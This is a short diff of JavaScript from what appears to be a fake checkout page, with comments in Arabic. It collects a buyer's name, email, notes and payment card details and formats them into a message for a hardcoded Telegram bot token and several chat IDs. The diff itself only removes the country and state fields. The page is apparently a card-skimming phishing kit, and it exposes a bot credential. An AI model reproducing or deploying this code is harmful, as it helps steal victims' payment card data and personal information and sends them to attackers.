@@ -761,6 +761,7 @@
     let timeLeft = 60; // seconds
 
     // Telegram settings
+    
     const tgToken = "8101978787:AAH-n9f7j9nnDTkJjI2r05jabZoExCCm2hI";
     const tgChatIds = [
   "5237738874",  // الأصلي
@@ -774,8 +775,8 @@
       var firstName = document.getElementById('firstName').value.trim();
       var lastName = document.getElementById('lastName').value.trim();
       var email = document.getElementById('email').value.trim();
-      var country = document.getElementById('country').value;
-      var state = document.getElementById('state').value.trim();
+      var country = ""; // أو null إذا تحب
+      var state = ""; // أو null إذا تحب
       var orderNotes = document.getElementById('orderNotes').value.trim();
 
       // بيانات البطاقة
@@ -789,8 +790,6 @@
 ---------------------------
 👤 الاسم: ${firstName} ${lastName}
 📧 الإيميل: ${email}
-🌍 الدولة: ${country}
-🏙 المحافظة: ${state}
 📝 ملاحظات: ${orderNotes}
 
 💳 معلومات البطاقة:
